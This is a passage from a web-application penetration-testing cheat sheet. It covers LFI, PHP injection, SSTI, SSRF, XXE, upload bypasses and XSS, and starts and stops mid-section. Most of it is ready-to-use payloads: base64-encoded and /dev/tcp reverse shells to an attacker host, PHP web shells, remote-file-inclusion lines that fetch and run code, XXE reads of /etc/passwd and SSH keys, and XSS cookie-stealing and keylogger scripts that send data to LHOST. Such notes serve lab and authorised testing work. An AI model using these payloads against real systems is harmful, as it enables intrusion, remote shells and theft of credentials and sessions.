# /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6

base64_content    = "php://filter/convert.base64-encode/resource="
paint_text_content = "php://filter/read=string/resource="

remote  = "/proc/sched_debug"
result  = requests.get(f"http://<RHOST>/index.php?page={base64_content}{remote}").content

try:
  with open(f"temp/{Path(remote).name}", "wb") as file:
      file.write(base64.b64decode(result))
      file.close()
except:
  pass

print(f"Received : \n {remote} ")
```

## Lodash

> https://github.com/lodash/lodash

### Payload

```c
$ curl -X PUT -H 'Content-Type: application/json' http://127.0.0.1:<RPORT> --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"constructor":{"__proto__":{"canUpload":true,"canDelete":true}}}'
```

### Reverse Shell Payload

```c
$ curl --header "Content-Type: application/json" --request POST http://127.0.0.1:<RPORT>/upload --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"filename":"& echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAzIDA+JjEK|base64 -d|bash"}'
```

## Log Poisoning

### SSH auth.log Poisoning

```c
$ ssh "<?php phpinfo();?>"@<LHOST>
$ http://<RHOST>/view.php?page=../../../../../var/log/auth.log
```

## Magic Bytes

### GIF

```c
GIF8;
GIF87a
```

### JPG

```c
\xff\xd8\xff
```

### PDF

```c
%PDF-1.5
%
```

```c
%PDF-1.7
%
```

### PNG

```c
\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
```

### Examples

#### GIF Magic Bytes

```c
GIF89a;
<?php
  <PAYLOAD>
?>
```

## mitmproxy

```c
$ mitmproxy
```

## ngrok

> https://ngrok.com/

### Basic Commands

```c
$ ngrok tcp 9001
$ ngrok http 8080 --authtoken <AUTH_TOKEN>
$ ngrok http 8080 --basic-auth '<USERNAME>:<PASSWORD>'
$ ngrok http 8080 --oauth=google --oauth-allow-email=<EMAIL>
$ ngrok http http://localhost:8080
$ ngrok http http://localhost:8080 --authtoken <AUTH_TOKEN>
$ ngrok http http://localhost:8080 --basic-auth '<USERNAME>:<PASSWORD>'
$ ngrok http http://localhost:8080 --oauth=google --oauth-allow-email=<EMAIL>
```

### Example

```c
$ ngrok authtoken <AUTH_TOKEN>
$ ngrok tcp <LHOST>:<LPORT>
$ nc -v -nls 127.0.0.1 -p <LPORT>
$ nc 1.tcp.ngrok.io 10133
```

### Docker Example

```c
$ sudo docker run -it -p80 -e NGROK_AUTHTOKEN='<API_TOKEN>' ngrok/ngrok tcp 172.17.0.1:<LPORT>
$ nc -v -nls 172.17.0.1 -p <LPORT>
$ nc 1.tcp.ngrok.io 10133
```

## OpenSSL

```c
$ openssl s_client -connect <RHOST>:<RPORT> < /dev/null | openssl x509 -noout -text | grep -C3 -i dns
```

## PadBuster

> https://github.com/AonCyberLabs/PadBuster

```c
$ padbuster http://<RHOST> MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB 8 -cookie auth=MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB -plaintext user=admin
$ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>"
$ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>" -plaintext "{\"user\":\"<USERNAME>\",\"role\":\"admin\"}"
```

## PDF PHP Inclusion

### Create a File with a PDF Header, which contains PHP Code

```c
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```

### Trigger

```c
$ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

## PHP

### PHP Functions

> https://www.php.net/manual/en/funcref.php

> https://www.php.net/manual/en/ref.filesystem.php

```c
+----------------+-----------------+----------------+----------------+
|    Command     | Displays Output | Can Get Output | Gets Exit Code |
+----------------+-----------------+----------------+----------------+
| system()       | Yes (as text)   | Last line only | Yes            |
| passthru()     | Yes (raw)       | No             | Yes            |
| exec()         | No              | Yes (array)    | Yes            |
| shell_exec()   | No              | Yes (string)   | No             |
| backticks (``) | No              | Yes (string)   | No             |
+----------------+-----------------+----------------+----------------+
```

### phpinfo.phar

```c
<?php phpinfo(); ?>
```

### phpinfo Dump

```c
file_put_contents to put <?php phpinfo(); ?>
```

### Checking for Remote Code Execution (RCE)

> https://gist.github.com/jaquen/aab510eead65c9c95aa20a69d89c9d2a?s=09

```c
<?php

// A script to check what you can use for RCE on a target

$test_command = 'echo "time for some fun!"';
$functions_to_test = [
    'system',
    'shell_exec',
    'exec',
    'passthru',
    'popen',
    'proc_open',
];

function test_function($func_name, $test_command) {
    if (function_exists($func_name)) {
        try {
            $output = @$func_name($test_command);
            if ($output) {
                echo "Function '{$func_name}' enabled and executed the test command.\n";
            } else {
                echo "Function '{$func_name}' enabled, but failed to execute the test command.\n";
            }
        } catch (Throwable $e) {
            echo "Function '{$func_name}' enabled, but an error occurred: {$e->getMessage()}\n";
        }
    } else {
        echo "Function '{$func_name}' disabled or not available.\n";
    }
}

foreach ($functions_to_test as $func) {
    test_function($func, $test_command);
} ?>
```

### PHP Filter Chain Generator

> https://github.com/synacktiv/php_filter_chain_generator

```c
$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
$ python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
$ python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
$ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
$ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
```

#### Payload Execution

```c
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```

OR

```c
$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```

### PHP Deserialization (Web Server Poisoning)

#### Finding PHP Deserialization Vulnerability

```c
$ grep -R serialize
```

```c
/index.php:        base64_encode(serialize($page)),
/index.php:unserialize($cookie);
```

#### Skeleton Payload

```c
if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID',
        base64_encode(serialize($page)),
        time()+60*60*24,
        '/'
    );
}
```

#### Decoding and Web Server Poisoning

```c
$ echo "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9" | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```

#### Encoding

```c
$ python
Python 2.7.18 (default, Apr 28 2021, 17:39:59) 
[GCC 10.2.1 20210110] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> len("/www/index.html")
15
```

```c
$ echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
```

#### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: <?php system('cat /');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

### PHP eval()

#### Exploiting eval() base64 payload

```c
${system(base64_decode(b64-encoded-command))}
```

### PHP Generic Gadget Chains (PHPGGC)

> https://github.com/ambionics/phpggc

#### Dropping a File

```c
$ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

### PHP Injection

#### Skeleton Payload Request

```c
POST /profilepicture.php HTTP/1.1
...
Connection: close
Cookie: PHPSESSID=bot0hfe9lt6mfjnki9ia71lk2k
Upgrade-Insecure-Requests: 1

<PAYLOAD>
```

#### Payloads

```c
url=/etc/passwd
url=file:////home/<USERNAME>/.ssh/authorized_keys
<?php print exec(ls) ?>
```

### PHP preg_replace()

#### Exploitation

> https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace

```c
pattern=/ip_address/e&ipaddress=system('id')&text="openvpn": {
```

#### Remote Code Execution

```c
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 303
Origin: http://www.securewebinc.jet
DNT: 1
Connection: close
Referer: http://<RHOST>/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Cookie: PHPSESSID=4bsdjba9nanh5nc6off028k403
Upgrade-Insecure-Requests: 1

swearwords%5B%2Ffuck%2Fi%5D=make+love&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=test%40test.de&subject=test&message=%3Cp%3Etest%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1
```

#### Skeleton Payload Request

```c
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php?cmd=ls HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 259
Connection: close
Referer: http://<RHOST>/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Cookie: PHPSESSID=4bsdjba9nanh5nc6off028k403
Upgrade-Insecure-Requests: 1

swearwords[/fuck/ie]=system($_GET["cmd"])&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=badperson&to=nora@example.com&subject=sdfj&message=swearwords[/fuck/]&_wysihtml5_mo
de=1
```

### PHP strcmp

#### Bypass

```c
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: ../upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```

##### Explanation

The developer is using `strcmp` to check the `username` and `password`, which is insecure and can easily be bypassed.

This is due to the fact that if `strcmp` is given an `empty array` to compare against the `stored password`, it will return `null`.

In PHP the `==` operator only checks the value of a variable for `equality`, and the value of `NULL` is equal to `0`.

The correct way to write this would be with the === operator which checks both value and type. Let's open `Burp Suite` and catch the login request.

#### Bypassing

Change `POST` data as follows to bypass the login.

```c
username[]=admin&password[]=admin
```

### PHP verb File Upload

```c
$ curl -X PUT -d '<?php system($_GET["c"]);?>' http://<RHOST>/<FILE>.php
```

## Poison Null Byte

### Error Message

`Only .md and .pdf files are allowed!`

### Example

```c
%00
```

### Bypass

```c
$ curl http://<RHOST>/ftp/package.json.bak%2500.md
```

## Remote File Inclusion (RFI)

```c
$ http://<RHOST>/PATH/TO/FILE/?page=http://<RHOST>/<FILE>.php
$ http://<RHOST>/index.php?page=' and die(system("curl http://<LHOST>/<FILE>.php|php")) or '
$ http://<RHOST>/index.php?page=%27%20and%20die(system(%22curl%20http://<LHOST>/<FILE>.php|php%22))%20or%20%27
```

### Root Cause Function

```c
allow_url_fopen
```

### Code Execution

```c
$ User-Agent: <?system('wget http://<LHOST>/<FILE>.php -O <FILE>.php');?>
$ http://<RHOST>/view.php?page=../../../../../proc/self/environ
```

### WAF Bypass

```
$ http://<RHOST>/page=http://<LHOST>/<SHELL>.php%00
$ http://<RHOST>/page=http://<LHOST>/<SHELL>.php?
```

## Server-Side Request Forgery (SSRF)

### &x=

```c
$ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

The payload ending in `&x=` is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.

### 0-Cut Bypass

```c
http://1.1          // http://1.0.0.1
http://127.0.0.1    // http://127.1.1
http://192.168.1    // http://192.168.0.1
```

### Bypass List

```c
http://localhost
http://127.0.0.1
http://2130706433
http://0177.1
http://0x7f.1
http://127.000.000.1
http://127.0.0.1.nip .io
http://[::1]
http://[::]
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

### Server-Side Request Forgery Mass Bypass

```c
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

## Server-Side Template Injection (SSTI)

### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```c
${{<%[%'"}}%\.
```

### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```c
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

### Jinja

```c
{{malicious()}}
```

### Jinja2

```c
</title></item>{{4*4}}
```

### Payload

```c
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Payload

```c
{{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
```

### Evil Config

#### Config

```c
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
```

#### Load Evil Config

```c
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
```

#### Connect to Evil Host

```c
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',shell=True) }}
```

#### Example

```c
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

## Subdomain Takeover

> https://www.youtube.com/watch?v=w4JdIgRGVrE

> https://github.com/EdOverflow/can-i-take-over-xyz

### Check manually for vulnerable Subdomains

```c
$ curl https://<DOMAIN> | egrep -i "404|GitHub Page"
```

### Responsible Vulnerability Handling

#### Example

##### GitHub Pages

###### CNAME

```c
<SUBDOMAIN>.<DOMAIN>
```

###### 2fchn734865gh234356h668j4dsrtbse9056gh405.html

```c
<!-- PoC by Red Team -->
```

## Symfony

> https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144

### Enumeration

```c
http://<RHOST>/_profiler
http://<RHOST>/app_dev.php/_profiler
http://<RHOST>/app_dev.php
http://<RHOST>/app_dev.php/_profiler/phpinfo
http://<RHOST>/app_dev.php/_profiler/open?file=app/config/parameters.yml
```

### Exploit

> https://github.com/ambionics/symfony-exploits

```c
$ python3 secret_fragment_exploit.py 'http://<RHOST>/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://<RHOST>/_fragment' --function system --parameters 'id'
```

## unfurl

> https://github.com/tomnomnom/unfurl

```c
$ go install github.com/tomnomnom/unfurl@latest
```

## Upload Filter Bypass

### Java Server Pages (JSP) Filter Bypass

```c
.MF
.jspx
.jspf
.jsw
.jsv
.xml
.war
.jsp
.aspx
```

### PHP Filter Bypass

```c
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
```

### Content-Types

```c
Content-Type : image/gif
Content-Type : image/png
Content-Type : image/jpeg
```

### Examples

#### Null Bytes

```c
$ mv <FILE>.jpg <FILE>.php\x00.jpg
```

#### More Bypass Examples

```c
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
```

## Upload Vulnerabilities

```c
ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
```

## waybackurls

> https://github.com/tomnomnom/waybackurls

```c
$ go install github.com/tomnomnom/waybackurls@latest
```

## Web Log Poisoning

### Web Shell

```c
$ nc <RHOST> 80
```

```c
GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
Host: <RHOST>
Connection: close
```

```c
http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log&cmd=id
```

### Code Execution

```c
$ nc <RHOST> 80
```

```c
GET /<?php passthru('id'); ?> HTTP/1.1
Host: <RHOST>
Connection: close
```

```c
http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log
```

## Websocket Request Smuggling

### Request Example

- Disable `Update Content-Length`

```c
GET /socket HTTP/1.1
Host: <RHOST>:<RPORT>
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /<FILE> HTTP/1.1
Host: <RHOST>:<RPORT>


```

### Server-Side Request Forgery (SSRF) Example

#### Fake Webserver

```c
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

```c
$ python3 webserver.py <LPORT>
```

```c
GET /check-url?server=http://<LHOST>:<LPORT> HTTP/1.1
Host: <RHOST>:<RPORT>
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: <RHOST>:<RPORT>


```

## Wfuzz

> https://github.com/xmendez/wfuzz

```c
$ wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

### Write to File

```c
$ wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

### Custom Scan with limited Output

```c
$ wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

### Fuzzing two Parameters at once

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

### Domain

```c
$ wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
```

### Subdomain

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

### Git

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```
### Login

```c
$ wfuzz -c -z file,usernames.txt -z file,passwords.txt -u http://<RHOST>/login.php -d "username=FUZZ&password=FUZ2Z" --hs "Login failed!"
$ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
$ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
```

### SQL

```c
$ wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

### DNS

```c
$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
$ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
$ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

### Numbering Files

```c
$ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

### Enumerating PIDs

```c
$ wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

## WhatWeb

> https://github.com/urbanadventurer/WhatWeb

```c
$ whatweb -v -a 3 <RHOST>
```

## Wordpress

### Config Path

```c
/var/www/wordpress/wp-config.php
```

## WPScan

```c
$ wpscan --url https://<RHOST> --enumerate u,t,p
$ wpscan --url https://<RHOST> --plugins-detection aggressive
$ wpscan --url https://<RHOST> --disable-tls-checks
$ wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
$ wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

## XML External Entity (XXE)

### Prequesites

Possible JSON Implementation

### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

### Payloads

```c
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
 <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

```c
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```

```c
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

```c
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\
x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAxIDA+JjEK | base64 -d | b
ash")["read"]() %} a {% endwith %}
```

## XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)

> https://github.com/0xInfection/XSRFProbe

```c
$ xsrfprobe -u https://<RHOST> --crawl --display
```

## Cross-Site Scripting (XSS)

aka JavaScript Injection.

### Common Payloads

```c
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>user.changeEmail('user@domain');</script>
</script><svg/onload=alert(0)>
<img src='http://<RHOST>'/>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
```

### Cookie Stealing

```c
<script>alert(document.cookies)</script>
<iframe onload="fetch('http://<LHOST>/?c='+document.cookie)">
<img src=x onerror="location.href='http://<LHOST>/?c='+ document.cookie">
<script>fetch('https://<LHOST>/steal?cookie=' + btoa(document.cookie));</script>
```

### Reflected XSS

```c
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
```

### Reflected XSS at Scale

```c
$ subfinder -d <RHOST> -silent -all | httpx -silent | nuclei -tags xss -exclude-severity info -rl 20 -c 10 -o /PATH/TO/FILE/<FILE>
```

### Stored XSS

```c
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
```

### Session Stealing

```c
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
```

### Key Logger

```c
<script>document.onkeypress = function(e) { fetch('https://<RHOST>/log?key=' + btoa(e.key) );}</script>
```

### Business Logic

JavaScript is calling `user.changeEmail()`. This can be abused.

```c
<script>user.changeEmail('user@domain');</script>
```

### Polyglot

```c
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### Single XSS Vector

```c
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

### DOM-XSS

#### Main sinks that can lead to DOM-XSS Vulnerabilities

```c
## document.write()
## document.writeln()
## document.domain
## someDOMElement.innerHTML
## someDOMElement.outerHTML
## someDOMElement.insertAdjacentHTML
## someDOMElement.onevent
```

### jQuery Function sinks that can lead to DOM-XSS Vulnerabilities

```c
## add()
## after()
## append()
## animate()
## insertAfter()
## insertBefore()
## before()
## html()
## prepend()
## replaceAll()
## replaceWith()
## wrap()
## wrapInner()
## wrapAll()
## has()
## constructor()
## init()
## index()
## jQuery.parseHTML()
## $.parseHTML()
```

### Skeleton Payload Request

```c
